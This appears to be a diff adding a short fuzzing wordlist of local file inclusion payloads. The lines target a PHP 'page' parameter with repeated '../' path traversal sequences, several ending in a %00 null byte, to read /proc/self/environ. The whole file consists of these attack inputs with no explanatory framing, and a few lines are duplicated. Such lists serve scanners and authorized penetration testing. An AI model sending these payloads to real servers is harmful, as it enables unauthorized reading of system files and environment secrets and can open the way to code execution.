@@ -1,0 +1,13 @@
+/index.php?page=/../../../proc/self/environ
+/index.php?page=/../../../../proc/self/environ
+/index.php?page=/../../../../../proc/self/environ
+/index.php?page=/../../../../../proc/self/environ
+/index.php?page=/../../../../../../proc/self/environ
+/index.php?page=/../../../../../../../proc/self/environ
+/index.php?page=/../../../../../../../proc/self/environ
+/index.php?page=/../../../proc/self/environ%00
+/index.php?page=/../../../../proc/self/environ%00
+/index.php?page=/../../../../../proc/self/environ%00
+/index.php?page=/../../../../../../proc/self/environ%00
+/index.php?page=/../../../../../../../proc/self/environ%00
+/index.php?page=/../../../../../../../../proc/self/environ%00
